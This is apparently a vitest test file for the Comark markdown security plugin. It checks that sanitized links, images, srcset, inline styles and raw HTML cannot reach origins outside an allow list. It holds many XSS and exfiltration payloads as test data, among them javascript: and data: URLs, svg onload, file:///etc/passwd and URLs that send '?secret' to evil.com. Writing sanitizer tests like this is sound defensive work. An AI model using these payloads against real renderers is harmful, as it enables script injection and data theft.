/**
 * URL cases ported from vercel-labs/markdown-sanitizers
 * (`rehype-harden/src/tests/index.test.ts`, MIT, commit 765c471).
 *
 * Upstream's unit tests mostly pin rehype-harden's own API (`[blocked]`
 * indicator spans, `target="_blank"`, a required `defaultOrigin`), which
 * Comark does not share. Only the attack inputs are ported here, with one
 * policy-neutral assertion: after sanitizing, no link or image may resolve,
 * from a page on PAGE_ORIGIN, to an origin outside the allow list.
 * Same-origin relative URLs are allowed, as Comark always keeps them.
 */
import { describe, expect, it, vi } from 'vitest'
import MarkdownIt from 'markdown-it'
import { parseFragment } from 'parse5'
import type { DefaultTreeAdapterMap } from 'parse5'
import { createMarkdownParser } from 'comark'
import { renderMarkdown } from 'comark/render'
import security from 'comark/plugins/security'
import { renderHtmlFromDocument } from '@comark/html'

vi.spyOn(console, 'warn').mockImplementation(() => {})

type Element = DefaultTreeAdapterMap['element']

const PAGE_ORIGIN = 'https://app.example'
const PAGES = [`${PAGE_ORIGIN}/`, `${PAGE_ORIGIN}/chat/123`, `${PAGE_ORIGIN}/a/b/c/`]

const markdownIt = new MarkdownIt({ html: true })

function collectUrls(html: string): Array<{ attribute: string; url: string }> {
  const urls: Array<{ attribute: string; url: string }> = []
  const walk = (nodes: DefaultTreeAdapterMap['childNode'][]) => {
    for (const node of nodes) {
      if (!('tagName' in node)) continue
      const element = node as Element
      for (const attr of element.attrs) {
        if (attr.name === 'href' || attr.name === 'src') urls.push({ attribute: attr.name, url: attr.value })
        if (attr.name === 'srcset') {
          for (const candidate of attr.value.split(',')) {
            const url = candidate.trim().split(/\s+/)[0]
            if (url) urls.push({ attribute: 'srcset', url })
          }
        }
      }
      walk(element.childNodes)
    }
  }
  walk(parseFragment(html).childNodes)
  return urls
}

/** Origins a URL resolves to from each page; `null` when the browser cannot parse it. */
function resolvedOrigins(url: string): Array<string | null> {
  return PAGES.map((page) => {
    try {
      const parsed = new URL(url, page)
      return parsed.protocol === 'http:' || parsed.protocol === 'https:' ? parsed.origin : parsed.protocol
    } catch {
      return null
    }
  })
}

function makePipelines(options: Parameters<typeof security>[0]) {
  const parse = createMarkdownParser({ plugins: [security(options)] })
  return {
    html: async (markdown: string) => renderHtmlFromDocument(await parse(markdown)),
    markdown: async (markdown: string) => markdownIt.render(await renderMarkdown(await parse(markdown))),
  }
}

function expectOnlyOrigins(html: string, allowed: string[]) {
  for (const { attribute, url } of collectUrls(html)) {
    for (const origin of resolvedOrigins(url)) {
      if (origin === null) continue
      expect([PAGE_ORIGIN, ...allowed], `${attribute}="${url}" in ${html}`).toContain(origin)
    }
  }
}

describe('rehype-harden URL cases', () => {
  describe('bad link URLs (allow list: https://github.com/)', () => {
    const badLinkUrls = [
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      'vbscript:msgbox("XSS")',
      'file:///etc/passwd',
      'about:blank',
      'tel:+1234567890',
      'ftp://ftp.example.com/file',
      '//evil.com/malware',
      'https://evil.com@github.com',
      'https://github.com.evil.com',
      'https://github.com%2e%2e%2f%2e%2e%2fevil.com',
      'https://github.com\\.evil.com',
      'https://github.com%00.evil.com',
      'https://github.com%E2%80%8B.evil.com',
      '\x00javascript:alert(1)',
      ' javascript:alert(1)',
      'javascript\x00:alert(1)',
      'jav&#x61;script:alert(1)',
      'jav&#97;script:alert(1)',
    ]

    for (const [name, pipeline] of Object.entries(
      makePipelines({ allowedLinkPrefixes: ['https://github.com/'], allowedImagePrefixes: [] })
    )) {
      it.each(badLinkUrls)(`${name}: [Test](%s)`, async (url) => {
        const html = await pipeline(`[Test](${url})`)
        expectOnlyOrigins(html, ['https://github.com'])
        expect(html).not.toMatch(/(?:href|src)="(?:javascript|vbscript|data|file):/i)
      })
    }
  })

  describe('bad image URLs (allow list: https://trusted.com/)', () => {
    const badImageUrls = [
      'javascript:void(0)',
      'vbscript:execute',
      'file:///etc/passwd',
      '//evil.com/tracker.gif',
      'https://evil.com@trusted.com/image.jpg',
      'https://trusted.com.evil.com/image.jpg',
      '\x00javascript:void(0)',
    ]

    for (const [name, pipeline] of Object.entries(
      makePipelines({ allowedImagePrefixes: ['https://trusted.com/'], allowedLinkPrefixes: [] })
    )) {
      it.each(badImageUrls)(`${name}: ![Test](%s)`, async (url) => {
        const html = await pipeline(`![Test](${url})`)
        expectOnlyOrigins(html, ['https://trusted.com'])
      })
    }
  })

  describe('network-path references in raw HTML (allow list: same origin only)', () => {
    // Upstream exercises these on a HAST tree; raw HTML reaches Comark's
    // security plugin the same way.
    const networkPaths = [
      '//other.example/x.png',
      '///other.example/x.png',
      '/\\other.example/x.png',
      '\\\\other.example/x.png',
      '/\t/other.example/x.png',
      '/\n/other.example/x.png',
      ' //other.example/x.png',
    ]

    for (const [name, pipeline] of Object.entries(
      makePipelines({ allowedLinkPrefixes: [`${PAGE_ORIGIN}/`], allowedImagePrefixes: [`${PAGE_ORIGIN}/`] })
    )) {
      it.each(networkPaths)(`${name}: %j`, async (url) => {
        const html = await pipeline(`<p><img src="${url}" alt="x"> <a href="${url}">x</a></p>`)
        expectOnlyOrigins(html, [])
      })
    }
  })

  describe('path-relative URLs that normalize to an empty first segment', () => {
    // Each resolves to `//other.example/...` as a *path* on the page origin.
    // Comark keeps relative URLs untouched; these check that neither renderer
    // turns them into a network-path reference.
    const variants = [
      '/.//other.example/x.png',
      '/././/other.example/x.png',
      './/other.example/x.png',
      '/a/..//other.example/x.png',
      '/a/b/../..//other.example/x.png',
      '/..//other.example/x.png',
      '../..//other.example/x.png',
      '/%2e//other.example/x.png',
      '/%2E%2E//other.example/x.png',
      '/.%2e//other.example/x.png',
      '/.///other.example/x.png',
      '/.//127.0.0.1/x.png',
      '/.//other.example:8080/x.png',
      '/.//user@other.example/x.png',
    ]

    for (const [name, pipeline] of Object.entries(
      makePipelines({ allowedLinkPrefixes: [`${PAGE_ORIGIN}/`], allowedImagePrefixes: [`${PAGE_ORIGIN}/`] })
    )) {
      it.each(variants)(`${name}: %s`, async (url) => {
        const html = await pipeline(`![Img](<${url}>) [Link](<${url}>)\n\n[Ref][r] ![Ref][r]\n\n[r]: <${url}>`)
        expectOnlyOrigins(html, [])
      })
    }
  })
})

/**
 * Gaps the bypass fixtures surfaced, reduced to one exfiltration payload each.
 * `it.fails` documents the current behavior; drop it once a fix lands.
 */
describe('reduced findings', () => {
  const options = { allowedLinkPrefixes: ['https://example.com'], allowedImagePrefixes: ['https://example.com'] }
  const { html, markdown } = makePipelines(options)

  // The browser keeps %2F / %5C, so `example.com%2F` is the userinfo and evil.com the host.
  it.each(['[x](https://example.com%2F@evil.com/?secret)', '![x](https://example.com%5C@evil.com/?secret)'])(
    'percent-encoded separator before "@" does not hide the host (149, 98): %s',
    async (input) => {
      for (const pipeline of [html, markdown]) expectOnlyOrigins(await pipeline(input), ['https://example.com'])
    }
  )

  it.each([
    'https://evil.com/?secret 1x',
    '/ok.png 1x, https://evil.com/?secret 2x',
    '/ok.png 1x,https://evil.com/?secret',
    'https://evil.com/?secret, /ok.png 2x',
  ])('srcset candidates are checked against allowedImagePrefixes (86): %s', async (srcset) => {
    for (const pipeline of [html, markdown]) {
      expectOnlyOrigins(await pipeline(`<img src="/ok.png" srcset="${srcset}">`), ['https://example.com'])
    }
  })

  it.each([
    '<span style="background:url(https://evil.com/?secret)">x</span>',
    '<span style="background:u\\72l(https://evil.com/?secret)">x</span>',
    'text{style="background:url(https://evil.com/?secret)"}',
  ])('inline style url() is checked against allowedImagePrefixes (86): %s', async (input) => {
    for (const pipeline of [html, markdown]) expect(await pipeline(input)).not.toContain('evil.com')
  })

  it('longdesc is checked like a link (86)', async () => {
    const out = await html('<img src="/ok.png" longdesc="https://evil.com/?secret">')
    expect(out).not.toContain('evil.com')
  })

  it('renderMarkdown escapes text inside an HTML block (140)', async () => {
    // The parser keeps `<svg onload=…>` as a text child of <blockquote>; written
    // back verbatim, a third-party renderer would read it as markup.
    const out = await markdown("<blockquote><svg onload=alert('xss')></blockquote>")
    expect(out).not.toMatch(/<svg[^>]*onload/i)
  })


  it('renderMarkdown escapes ")" in a link destination (41)', async () => {
    // `https://safe.com)…` fails URL parsing, so security() keeps it as relative;
    // written back unescaped, the destination ends at ")" and becomes https://safe.com.
    expectOnlyOrigins(await markdown("![](https://safe.com\\)javascript:alert('XSS'))"), ['https://example.com'])
  })
})
